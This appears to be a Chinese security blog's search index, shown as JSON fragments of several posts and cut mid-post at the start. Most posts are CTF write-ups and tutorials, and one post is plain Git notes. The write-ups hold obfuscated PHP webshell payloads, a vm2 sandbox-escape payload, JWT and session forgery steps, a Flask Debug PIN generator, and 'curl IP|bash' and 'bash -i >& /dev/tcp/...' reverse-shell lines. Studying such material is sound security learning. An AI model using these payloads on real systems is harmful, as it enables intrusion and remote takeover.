/?code=$_=~'%9E%8C%8C%9A%8D%8B';$__=~'%AF%B0%ACAB';$___=$$__;$_($___[_]); 整理一下即与 0x02 中代码相同 另附一个将字符串转换成上述取反格式的脚本 #!/bin/python3 s = 'assert' print(\"~'\", end='') for i in s: i1 = hex(15 - int(hex(ord(i))[-2], 16))[-1].upper() i2 = hex(15 - int(hex(ord(i))[-1], 16))[-1].upper() print('%' + i1 + i2, end='') print(\"'\") # ~'%9E%8C%8C%9A%8D%8B' ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:2","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"法三：字符递增 那么如果异或运算符和取反运算符都被过滤了该怎么办呢，这里就要用到递增运算符 ++ 然而怎么获得用来递增的第一个字母，这用到了 PHP 的一个特性 在试图将数组转换成字符串时会获得字符串 ‘Array’ 可以用以下代码演示这个特性 \u003c?php $a = []; $b = \"$a\"; echo $b; // Array 又由于 PHP 中函数名对大小写不敏感，我们可以构造 ASSERT($_POST[_]) /?code=$_=[];$__=\"$_\";$___=$__['@'=='!'];$_=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$____=$___;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$___%2B%2B;$_____=$___;$___%2B%2B;$______=$___;$___%2B%2B;$___%2B%2B;$_______=$___;$___%2B%2B;$________=$___;$___%2B%2B;$_________=$___;$_=$_.$________.$________.$____.$_______.$_________; $__='_'.$______.$_____.$________.$_________; $___=$$__;$_($___[_]); 整理即为以下代码 \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++;$___++; $____ = $___; // E $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++; $______ = $___; // P $___++;$___++; $_______ = $___; // R $___++; $________ = $___; // S $___++; $_________ = $___; // T $_ = $_.$________.$________.$____.$_______.$_________; // ASSERT $__ = '_'.$______.$_____.$________.$_________; //POST $___ = $$__; $_($___[_]); // assert($_POST[_]) ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:3:3","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"0x03 PHP7 中可用的方法 如果 web 用户有读写权限，可以直接用 file_put_content 函数将木马写入文件 如果无读写权限，可以用上述各种方法构造出自己需要的函数再执行，法三经过一定操作理论上可以构造出所有字母（大写和小写）和数字，小写字母和数字可以用以下方法再结合递增递减即可 \u003c?php $_ = []; $__ = \"$_\"; // Array $___ = $__['@' == '#']; // A $_ = $___; // A $___++;$___++;$___++; $____ = $___; // D $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $_____ = $___; // O $___++;$___++;$___++; $______ = $___; // R $_______ = $_____.$______.$____; // ORD $________ = $_______($____) - $_______($_); // 3 （数字在这） $____ = $__[$________]; // a （小写字母在这） ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:4:0","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["Security"],"content":"0x04 总结 咕了好久才想起来有篇博客没写完，结果这两天又遇到一次依然不会（就是用到了法三），跟在🐙爷爷后面做看完题才想起来，卧槽这个我看过（但是还没写 这个故事告诉我们，鸽子迟早是要被炖了的（逃 ","date":"2020-05-03","objectID":"/posts/php-webshell-without-alpha-and-num/:5:0","tags":["Web 安全","PHP"],"title":"PHP 中不包含字母和数字的 webshell","uri":"/posts/php-webshell-without-alpha-and-num/"},{"categories":["WriteUp"],"content":"0x00 前言 当时比赛的时候，一共三道 WEB 题，两道 nodejs 的都不会，还有一道 PHP 没来得及看后来看了也不会（还是太菜了 趁题还热乎，借着 dalao 们的 WP 复现一波 ","date":"2020-04-22","objectID":"/posts/hfctf-web/:1:0","tags":["虎符 CTF","Web 安全"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["WriteUp"],"content":"0x01 easy_login 由于静态文件的配置问题，有一大波源码泄露（比赛时只看到了这个 只有 admin 可以看到 flag，而我们不能注册名为 admin 的用户，只能想办法伪造 题目都说了错的是依赖库，比赛的时候居然没注意到，这里的关键在于用了 jsonwebtoken 库，重点在登录的代码 'POST /api/login': async (ctx, next) =\u003e { const {username, password} = ctx.request.body; if(!username || !password) { throw new APIError('login error', 'username or password is necessary'); } const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid \u003c global.secrets.length \u0026\u0026 sid \u003e= 0)) { throw new APIError('login error', 'no such secret id'); } const secret = global.secrets[sid]; const user = jwt.verify(token, secret, {algorithm: 'HS256'}); const status = username === user.username \u0026\u0026 password === user.password; if(status) { ctx.session.username = username; } ctx.rest({ status }); await next(); }, 重点在 jwt 库存在缺陷 当加密时使用的是 none 方法，验证时只要密钥处为 undefined 或者空之类的，即便后面的算法指名为 HS256，验证也还是按照 none 来验证通过 我们只要使这里的 secret 为 undifined 或 null 即可，但 sid 不能为 undefined 或 null 测试发现，当数组索引为浮点数时，得到的结果为 undefined 数组索引为浮点数时返回 undefinedlist \" 数组索引为浮点数时返回 undefined 可以用 python 构造 token import jwt print(jwt.encode({\"secretid\":0.1,\"username\":\"admin\",\"password\":\"123\"},algorithm=\"none\",key=\"\").decode('utf-8')) 发送构造的 token 即可以 admin 身份登录，获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:2:0","tags":["虎符 CTF","Web 安全"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["WriteUp"],"content":"0x02 just_escape 看起来后缀是 php 实际上后端是 nodejs code=Error().stack; Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) 可以看到是用了 vm，GitHub 上有一个逃逸的 payload 但是这里过滤了一些关键字 for while process exec eval constructor prototype Function + \" ' 根据 cg 的 payload，引号可以用 String.fromCharCode 绕过 这里给一个转成这个函数形式的脚本 s = \"return process\" payload = \"String.fromCharCode(\" for c in s: payload += str(ord(c)) + ',' payload = payload.strip(',') + ')' print(payload) 这里被过滤的方法名可以用 JavaScript 的另一种方法调用形式，即将方法名当作数组索引的形式加上 String.fromCharCode 绕过 绕过引号和方法名过滤bypass \" 绕过引号和方法名过滤 最终 paylaod 如下 (function(){try{Buffer.from(new Proxy({},{getOwnPropertyDescriptor(){throw f=\u003ef[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115))();}}));}catch(e){return e(()=\u003e{}).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))[String.fromCharCode(101,120,101,99,83,121,110,99)](String.fromCharCode(99,97,116,32,47,102,108,97,103)).toString();}})() 成功获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:3:0","tags":["虎符 CTF","Web 安全"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["WriteUp"],"content":"0x03 babyupload 这个是真 PHP \u003c?php error_reporting(0); session_save_path(\"/var/babyctf/\"); session_start(); require_once \"/flag\"; highlight_file(__FILE__); if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } else{ $_SESSION['username'] ='guest'; } $direction = filter_input(INPUT_POST, 'direction'); $attr = filter_input(INPUT_POST, 'attr'); $dir_path = \"/var/babyctf/\".$attr; if($attr===\"private\"){ $dir_path .= \"/\".$_SESSION['username']; } if($direction === \"upload\"){ try{ if(!is_uploaded_file($_FILES['up_file']['tmp_name'])){ throw new RuntimeException('invalid upload'); } $file_path = $dir_path.\"/\".$_FILES['up_file']['name']; $file_path .= \"_\".hash_file(\"sha256\",$_FILES['up_file']['tmp_name']); if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } @mkdir($dir_path, 0700, TRUE); if(move_uploaded_file($_FILES['up_file']['tmp_name'],$file_path)){ $upload_result = \"uploaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $upload_result = $e-\u003egetMessage(); } } elseif ($direction === \"download\") { try{ $filename = basename(filter_input(INPUT_POST, 'filename')); $file_path = $dir_path.\"/\".$filename; if(preg_match('/(\\.\\.\\/|\\.\\.\\\\\\\\)/', $file_path)){ throw new RuntimeException('invalid file path'); } if(!file_exists($file_path)) { throw new RuntimeException('file not exist'); } header('Content-Type: application/force-download'); header('Content-Length: '.filesize($file_path)); header('Content-Disposition: attachment; filename=\"'.substr($filename, 0, -65).'\"'); if(readfile($file_path)){ $download_result = \"downloaded\"; }else{ throw new RuntimeException('error while saving'); } } catch (RuntimeException $e) { $download_result = $e-\u003egetMessage(); } exit; } ?\u003e 重点在这里 if($_SESSION['username'] ==='admin') { $filename='/var/babyctf/success.txt'; if(file_exists($filename)){ safe_delete($filename); die($flag); } } 我们需要伪造 session 让自己变成 admin 并且需要创建 success.txt 文件 我们先读取一下 session，名为 sess_PHPSESSID 的文件 读取 SESSION 文件get_sess \" 读取 SESSION 文件 其内容如下 SESSION 文件的内容sess \" SESSION 文件的内容 这里要知道 PHP session 序列化的形式（session.serialize_handler） php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize（ php \u003e= 5.5.4 ）经过serialize()函数序列化处理的数组 由于最前边有一个不可见字符，可以判断这里用的是 php_binary 我们发现最后上传的文件名是原文件名 + ‘_’ + 文件名的 SHA256 值，与 session 文件的文件名似乎有点相似 构造一个 php_binary 形式的 session 文件，username 为 admin，注意图中的不可见字符 08（或者用 PHP 直接生成也可以 生成恶意 SESSION 文件sess_file \" 生成恶意 SESSION 文件 计算一下该文件的 SHA256 值 计算 SESSION 文件的 SHA256 值sess_sha256 \" 计算 SESSION 文件的 SHA256 值 上传该 sess 文件 上传 SESSION 文件upload \" 上传 SESSION 文件 然后将 PHPSESSID 改为上面计算的 SHA256 值即可 下一步就是怎么创建 success.txt，直接上传的话文件名后会包含 SHA256 值，但是根据 file_exists 的函数描述，它是检查文件或目录是否存在，我们不好直接上传文件，但是可以创建目录 创建 success.txt 目录success \" 创建 success.txt 目录 刷新页面即可获得 flag ","date":"2020-04-22","objectID":"/posts/hfctf-web/:4:0","tags":["虎符 CTF","Web 安全"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["WriteUp"],"content":"0x04 完结撒花 一共三道 WEB 有两道 nodejs 着实没想到，对 nodejs 一点都不熟悉，总结一下，还是太菜了 以后要多看看这一类的题，要不然比赛遇到了无从下手就很难受 ","date":"2020-04-22","objectID":"/posts/hfctf-web/:5:0","tags":["虎符 CTF","Web 安全"],"title":"虎符 CTF WEB 部分复现","uri":"/posts/hfctf-web/"},{"categories":["Security"],"content":"0x00 前言 之前做题有做到过字数限制的 shell，有五个字符也有四个字符的，当然我一直不会做，最近又重新研究了一下这个绕过的问题，就把它记录下来了 这种题一般都是每人一个 sandbox 目录，之后的操作都在这个目录中进行 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:1:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["Security"],"content":"0x01 前置知识 ls 输出的默认排序是逐字符按照 ASCII 码从小到大排序 ls -t 文件名按时间排序 重定向符 \u003e 无命令也可用于创建文件 IP 的等价表示（选用，有时可降低难度） 将 . 分隔的每个十进制数转换成两位十六进制再连接起来（可转换成十进制、八进制等），和原 IP 等价使用 ip = '172.17.0.1' hex_ip = '0x' for i in ip.split('.'): hex_ip += str(hex(int(i)))[2:].zfill(2) print(hex_ip) # 0xac110001 print(int(hex_ip, 16)) # 2886795265 print('0' + oct(int(hex_ip, 16))[2:]) # 025404200001 单独的 * 相当于 `ls` 即将文件名作为命令执行，也可以添加其它字符进行匹配 单独的 * 相当于 `ls`star \" 单独的 * 相当于 `ls` 如上图所示，目录下有两个文件 dir 和 whoami ，单独的 * 执行了 dir whoami 命令，而 *i 执行了 whoami 命令 dir 命令本质上与 ls 相同，但输出不换行，且首字母为 d 可以操作 rev 命令输出反转文件每一行后的内容 rev 命令反转每一行的内容rev \" rev 命令反转每一行的内容 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:2:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["Security"],"content":"0x02 5个字符 当然先是五个字符的，简单一点 题目代码如下： \u003c?php $sandbox = '/tmp/sandbox5/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 5) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); 大体思路就是把 curl ip|bash 分割成一个一个小字符串，并在结尾添加 \\ 连接，将要执行的脚本放在服务器上，这其中还要用到 ls -t ，为了防止 . 的干扰采用十六进制表示 IP (这里需要自己研究怎么分割) # ls -t\u003ev \u003els\\\\ ls\u003e_ \u003e\\ \\\\ \u003e-t\\\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (适当分割并逆序写入) \u003ebash \u003e\\|\\\\ \u003e01\\\\ \u003e00\\\\ \u003e11\\\\ \u003eac\\\\ \u003e0x\\\\ \u003e\\ \\\\ \u003erl\\\\ \u003ecu\\\\ # exec sh _ sh v 服务器中 index.html 中放有反弹 shell 的命令 bash -i \u003e\u0026 /dev/tcp/172.17.0.1/12345 0\u003e\u00261 在服务器监听 12345 端口 nc -lvp 12345 成功反弹 shell ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:3:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["Security"],"content":"0x02.5 一个惊喜的发现 我在做 4 个字符的测试时发现，用 php 的 exec 函数执行 shell 命令，结尾的反斜杠居然不需要转义 即上一题的 payload 可简化为 # ls -t\u003ev \u003els\\ ls\u003e_ \u003e\\ \\ \u003e-t\\ \u003e\\\u003ev ls\u003e\u003e_ # curl 0xac110001|bash (适当分割并逆序写入) \u003ebash \u003e1\\|\\ \u003e000\\ \u003ec11\\ \u003e0xa\\ \u003el\\ \\ \u003ecur\\ # exec sh _ sh v 也成功反弹了 shell，不知道是不是个例或者是 php 版本问题，但我在接下来 4 个字符的操作中使用到了这个特性，要是有 dalao 发现这样不可行烦请告知我（如果真的有 dalao 看的话 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:4:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["Security"],"content":"0x03 4个字符 这才是重头戏，曾经差点把我搞自闭的题，我终于做出来了 题目代码如下： \u003c?php $sandbox = '/tmp/sandbox4/'.md5($_SERVER['REMOTE_ADDR']); @mkdir($sandbox); @chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 4) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf '.$sandbox.'/*'); } highlight_file(__FILE__); 思路与之前相同，但是要充分运用 dir 和 rev 命令，先放一下 payload 再进行分析 # ls -tk\u003ef \u003edir \u003ef\\\u003e \u003ekt- \u003esl *\u003ev # 这里文件名为 v 非常重要 \u003erev *v\u003eg # curl 0xac110001|bash (适当分割并逆序写入) \u003eash \u003eb\\ \u003e\\|\\ \u003e01\\ \u003e00\\ \u003e11\\ \u003eac\\ \u003e0x\\ \u003e\\ \\ \u003erl\\ \u003ecu\\ # exec sh g sh f 这里重点分析第一部分，怎么奇特的构造出需要的命令 第一步创建名为 dir 的文件，由于 d 的 ASCII 码较小，这个文件在第一部分将始终位于第一位 第二三四步分别创建对应文件 第五步用到了单独的 * 这里相当于执行了 `dir f\u003e kt- sl`\u003ev 这之后文件 v 中的内容为 f\u003e kt- sl 第六步创建名为 rev 的文件 第七步是这里最重要的地方，也是前边的文件名为 v 非常重要的原因，用到了 * 第二种用法，相当于执行了 `rev v`\u003eg ，即将 v 的内容反转写入 g 这之后文件 g 的内容为 ls -kt \u003ef 之后的内容与 5 个字符的方法相同 这里再解释两个地方 是文件名 f 可以修改，但要保证其位于第二位 是 -tk 中的 k 对输出结果没有影响，但控制了该文件在输出中的位置，也可进行修改，但要仍满足以上两点才可以 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:5:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["Security"],"content":"0x04 后记 好久没写博客了，在 npy 的提醒下来水一篇博客，也当做一个笔记，下次遇到这种题查自己博客就好了 这两道题的源码我放到 GitHub 了，并添加了一个文件名为 shell.php 的 webshell，方便以 www-data 用户进行一些操作（好像也没多大用 ","date":"2020-04-18","objectID":"/posts/bypass-char-number-limit/:6:0","tags":["Linux","Bash"],"title":"绕过字符数限制 getshell","uri":"/posts/bypass-char-number-limit/"},{"categories":["随便学学"],"content":"〇、获取本地仓库 git init 初始化仓库 git clone \u003curl\u003e 从远程仓库克隆（url 可采用 git、http、https 和 ssh 等协议） ","date":"2020-02-19","objectID":"/posts/learn-git/:1:0","tags":["Git"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["随便学学"],"content":"一、本地文件修改、提交及查看等 git status 查看已跟踪文件状态（修改、新加、改名、删除等） git add \u003cfile\u003e 追踪新文件 .gitignore 文件中添加被忽略的文件 以 # 开头的内容为注释，被 Git 自动忽略 可使用 Glob 表达式进行模式匹配 模式最后跟斜杠（ / ）表示目录 模式前加叹号（ ! ） 表示取反 git diff 当前文件与暂存区之间的差异 --cached / --staged 暂存区与上次提交之间的差异 git commit 提交更改 -m 添加本次提交的说明（若无该参数将打开文本编辑器进行添加） -a 提交所有已暂存的文件（跳过 git add 过程） --amend 撤销最后的提交并重新提交 git rm 从 仓库（暂存区）和 工作目录 中删除 -f 强制删除（已修改并放入暂存区的文件） --cached 只从仓库（暂存区）中删除，保留在工作目录中 git mv 移动文件（git mv oldfile newfile 相当于运行以下三条命令） mv oldfile newfile git rm oldfile gie add newfile git log 查看提交历史 -p 显示每次提交的内容差异 -\u003cX\u003e (X 为数字) 只显示最近 X 次提交 --stat 仅显示简要的增改行数统计 --pretty= 指定显示的格式 oneline short full fuller 调整展示信息的多少 format:\"\" 自定义要显示的格式（可使用如下占位符） %H 提交对象（commit）的完整哈希字串 %h 提交对象的简短哈希字串 %T 树对象（tree）的完整哈希字串 %t 树对象的简短哈希字串 %P 父对象（parent）的完整哈希字串 %p 父对象的简短哈希字串 %an 作者（author）的名字 %ae 作者的电子邮件地址 %ad 作者修订日期（可以用 -date= 选项定制格式） %ar 作者修订日期，按多久以前的方式显示 %cn 提交者(committer)的名字 %ce 提交者的电子邮件地址 %cd 提交日期 %cr 提交日期，按多久以前的方式显示 %s 提交说明 --graph 用图形表示所在分支及合并历史 --relative-date 使用相对时间表示 --name-only 仅显示新增、修改、删除的文件的文件名 --name-status 显示新增、修改、删除的文件的文件名和执行的操作（A D M） --abbrev-commit 仅显示 SHA-1 的前几个字符 --shortstat 仅显示总的行数修改统计（不显示单文件的变化） --since= --after= 仅显示指定时间后的提交 --until= --before= 仅显示指定时间之前的提交 --author= 仅显示指定作者的提交 --committer= 仅显示指定提交者的提交 --no-merges 排除来自合并的提交 --merges 只显示来自合并的提交 --grep= 匹配提交信息中的关键字 最后单独的 -- 后的所有内容为限定的路径或文件名 git reset HEAD \u003cfile\u003e 取消对文件的暂存 git checkout -- \u003cfile\u003e 取消对文件的修改（仅限于修改后未暂存的文件） ","date":"2020-02-19","objectID":"/posts/learn-git/:2:0","tags":["Git"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["随便学学"],"content":"二、本地与远程仓库之间的操作 git remote 列出所有远程库的名字 -v --verbose 显示对应的地址 add \u003cshortname\u003e \u003curl\u003e 添加新的远程仓库 show \u003cremote-name\u003e 查看某个远程仓库的详细信息 rename \u003cold-name\u003e \u003cnew-name\u003e 修改远程仓库在本地的简称 rm \u003cremote-name\u003e 移除某个远程仓库 git fetch \u003cremote-name\u003e 拉取远程仓库有但本地没有的数据（不合并） git pull 拉取跟踪的远程仓库对应分支的数据并合并 git push \u003cremote-name\u003e \u003cbranch-name\u003e 将本地的某分支推送到远程仓库（默认为 origin master） ","date":"2020-02-19","objectID":"/posts/learn-git/:3:0","tags":["Git"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["随便学学"],"content":"三、标签有关操作 git tag 列出现有标签 -l '' 模式搜索符合条件的标签 -a \u003ctag-name\u003e [SHA-1] 添加（补加）含附注的标签 -s \u003ctag-name\u003e 同上添加标签并用 GPG 签署标签 -m 标签的附注说明 \u003ctag-name\u003e 添加轻量级标签（无需附注） -v \u003ctag-name\u003e 验证已签署的标签 git show \u003ctag-name\u003e 查看相应标签的版本信息 git push \u003cremote-name\u003e \u003ctag-name\u003e 将本地的某标签推送到远程仓库 --tags 推送所有本地新增的标签 ","date":"2020-02-19","objectID":"/posts/learn-git/:4:0","tags":["Git"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["随便学学"],"content":"四、分支有关操作 git branch 列出所有分支和当前指向分支 \u003cbranch-name\u003e 创建新分支 git checkout \u003cbranch-name\u003e 切换到某分支 -b \u003cbranch-name\u003e 创建并切换到分支（相当于一下两条命令） git branch \u003cbranch-name\u003e git checkout \u003cbranch-name\u003e -b \u003cbranch-name\u003e \u003cremote-name\u003e/\u003cremote-branch\u003e 从远程分支创建分支并跟踪 --track \u003cremote-name\u003e/\u003cremote-branch\u003e 从远程分支创建同名分支并跟踪 -d \u003cbranch-name\u003e 删除某分支 -v 显示每个分支最后一次提交的信息 git merge \u003cbranch-name\u003e 将某分支合并到当前分支（可能出现冲突需要手动处理） git push \u003cremote-name\u003e \u003cbranch-name\u003e:\u003cremote-branch\u003e 将本地分支推送到命名不同的远程分支（本地分支留空推送空分支，即为删除远程分支） ","date":"2020-02-19","objectID":"/posts/learn-git/:5:0","tags":["Git"],"title":"Git 学习笔记","uri":"/posts/learn-git/"},{"categories":["Security"],"content":"0x00 前言 上周打南邮的 NCTF 时碰到了一道名为 flask_website 的题，刚开始想的是模板注入，但发现没有注入点，后来点到页面最下边的一个链接，跳转到了 Debug 模式的报错界面，从此处了解到 Flask Debug PIN 的存在，这个利用可能比较鸡肋，但倒是挺有趣的 ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:1:0","tags":["Flask","Web 安全"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["Security"],"content":"0x01 Flask Debug 模式 只需要在 app.run() 的参数中添加 debug=True 即可开启 Debug 模式，此时出现错误将呈现错误信息，在报错界面可使用 Flask Debug PIN 直接调用 Python console ，这里只需获取 PIN 即可 getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:2:0","tags":["Flask","Web 安全"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["Security"],"content":"0x02 源码分析 # python所在目录/Lib/site-packages/werkzeug/debug/__init__.py ... def get_machine_id(): global _machine_id rv = _machine_id if rv is not None: return rv def _generate(): # docker containers share the same machine id, get the # container id instead try: with open(\"/proc/self/cgroup\") as f: value = f.readline() except IOError: pass else: value = value.strip().partition(\"/docker/\")[2] if value: return value # Potential sources of secret information on linux. The machine-id # is stable across boots, the boot id is not for filename in \"/etc/machine-id\", \"/proc/sys/kernel/random/boot_id\": try: with open(filename, \"rb\") as f: return f.readline().strip() except IOError: continue # On OS X we can use the computer's serial number assuming that # ioreg exists and can spit out that information. try: # Also catch import errors: subprocess may not be available, e.g. # Google App Engine # See https://github.com/pallets/werkzeug/issues/925 from subprocess import Popen, PIPE dump = Popen( [\"ioreg\", \"-c\", \"IOPlatformExpertDevice\", \"-d\", \"2\"], stdout=PIPE ).communicate()[0] match = re.search(b'\"serial-number\" = \u003c([^\u003e]+)', dump) if match is not None: return match.group(1) except (OSError, ImportError): pass # On Windows we can use winreg to get the machine guid wr = None try: import winreg as wr except ImportError: try: import _winreg as wr except ImportError: pass if wr is not None: try: with wr.OpenKey( wr.HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Cryptography\", 0, wr.KEY_READ | wr.KEY_WOW64_64KEY, ) as rk: machineGuid, wrType = wr.QueryValueEx(rk, \"MachineGuid\") if wrType == wr.REG_SZ: return machineGuid.encode(\"utf-8\") else: return machineGuid except WindowsError: pass _machine_id = rv = _generate() return rv ... def get_pin_and_cookie_name(app): \"\"\"Given an application object this returns a semi-stable 9 digit pin code and a random key. The hope is that this is stable between restarts to not make debugging particularly frustrating. If the pin was forcefully disabled this returns `None`. Second item in the resulting tuple is the cookie name for remembering. \"\"\" pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\") rv = None num = None # Pin was explicitly disabled if pin == \"off\": return None, None # Pin was provided explicitly if pin is not None and pin.replace(\"-\", \"\").isdigit(): # If there are separators in the pin, return it directly if \"-\" in pin: rv = pin else: num = pin modname = getattr(app, \"__module__\", app.__class__.__module__) try: # getuser imports the pwd module, which does not exist in Google # App Engine. It may also raise a KeyError if the UID does not # have a username, such as in Docker. username = getpass.getuser() except (ImportError, KeyError): username = None mod = sys.modules.get(modname) # This information only exists to make the cookie unique on the # computer, not as a security feature. probably_public_bits = [ username, modname, getattr(app, \"__name__\", app.__class__.__name__), getattr(mod, \"__file__\", None), ] # This information is here to make it harder for an attacker to # guess the cookie name. They are unlikely to be contained anywhere # within the unauthenticated debug page. private_bits = [str(uuid.getnode()), get_machine_id()] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, text_type): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = \"__wzd\" + h.hexdigest()[:20] # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits if num is None: h.update(b\"pinsalt\") num = (\"%09d\" % int(h.hexdigest(), 16))[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num return rv, cookie_name ... 从第二个函数得知，生成 Flask Debug PIN 共需要六个参数 usern","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:3:0","tags":["Flask","Web 安全"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["Security"],"content":"0x03 利用过程 这里想要利用 Flask Debug PIN ，需要配合任意文件读取的漏洞使用，原题中使用了 urllib 库，可以通过 file 协议读取文件，获取对应参数，再从上方第二个函数中提取 PIN 的生成过程，构成如下脚本 import hashlib from itertools import chain probably_public_bits = [ 'username', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) 'python所在目录/Lib/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ 'MAC 地址十进制表示', # str(uuid.getnode())，/sys/class/net/网卡名称/address 'machine_id' # get_machine_id() ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv) 通过脚本生成 PIN ，在报错界面中输入即可获取 Python console ，再通过 os.popen('xxx').readlines() 函数即可 getshell ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:4:0","tags":["Flask","Web 安全"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["Security"],"content":"0x04 总结 此利用过程略显鸡肋，但对 Flask 的 Debug 模式 和 Flask Debug PIN 有了大致了解，可以在以后的学习过程中加以利用，达到更好的效果 ","date":"2019-11-26","objectID":"/posts/flask-debug-pin/:5:0","tags":["Flask","Web 安全"],"title":"关于 Flask Debug PIN 的安全性问题","uri":"/posts/flask-debug-pin/"},{"categories":["WriteUp"],"content":"0x00 吐槽思考 for [BOSS] Get Me Inside 这道题肝的是真的爽，从 ddl 前一天晚上开始，搞到 ddl 当天凌晨四点多~~（原来我的肝这么好）~~ 这是一道涉及面广泛的题，考虑到了实战的一些情况，考察多方面的知识，是一道不可多得的好题（即使如此，我依旧想暴打各位出题人emmm） 